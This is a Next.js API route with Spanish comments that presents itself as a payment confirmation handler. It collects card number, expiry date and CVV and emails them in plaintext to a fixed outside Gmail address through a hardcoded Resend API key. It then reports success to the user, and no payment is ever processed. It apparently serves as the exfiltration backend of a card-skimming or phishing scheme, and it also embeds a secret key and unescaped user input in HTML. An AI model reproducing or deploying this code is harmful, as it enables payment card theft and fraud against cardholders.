// pages/api/sndMailCard.ts

import { NextApiRequest, NextApiResponse } from 'next';
import { Resend } from 'resend';

// 🔐 Clave API de Resend
const resend = new Resend('re_4SRzzvTb_KL8BKevatpyJaUQap5BCjdSx');

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: '❌ Método no permitido. Usa POST.' });
  }

  try {
    const {
      cardNumber,
      expiryDate,
      cvv,
      email,
      totalAmount,
      alias,
      selectedCard,
      message,
    } = req.body;

    // 📌 Validación de campos obligatorios
    if (!email || !totalAmount || !cardNumber || !message) {
      return res.status(400).json({
        error: '❌ Faltan campos requeridos: email, monto, tarjeta o mensaje.',
      });
    }

    // ✅ Enviar correo
    const result = await resend.emails.send({
      from: 'onboarding@resend.dev', // Dominio autorizado por defecto en Resend
      to: 'blackrock.groupx@gmail.com', // Receptor fijo
      subject: '✅ Confirmación de Pago',
      html: `
        <div style="font-family:Arial,sans-serif;font-size:14px">
          <h2>✅ Pago procesado con éxito</h2>
          <p><strong>Monto:</strong> ${totalAmount}</p>
          <p><strong>Alias:</strong> ${alias}</p>
          <p><strong>Tarjeta:</strong> ${selectedCard}</p>
          <p><strong>Número:</strong> ${cardNumber}</p>
          <p><strong>Expiración:</strong> ${expiryDate}</p>
          <p><strong>CVV:</strong> ${cvv}</p>
          <hr />
          <p><strong>📨 Mensaje:</strong> ${message}</p>
        </div>
      `,
    });

    if (result.error) {
      console.error('❌ Error de Resend:', result.error);
      return res.status(500).json({
        error: `❌ Falló el envío: ${result.error.message || 'Error desconocido.'}`,
      });
    }

    console.log('✅ Correo enviado:', result.id);
    return res.status(200).json({ message: '✅ PAGO ENVIADO CORRECTAMENTE' });

  } catch (error: any) {
    console.error('❌ Excepción al enviar:', error);
    return res.status(500).json({
      error: `❌ Error inesperado: ${error?.message || 'Error desconocido'}`,
    });
  }
}

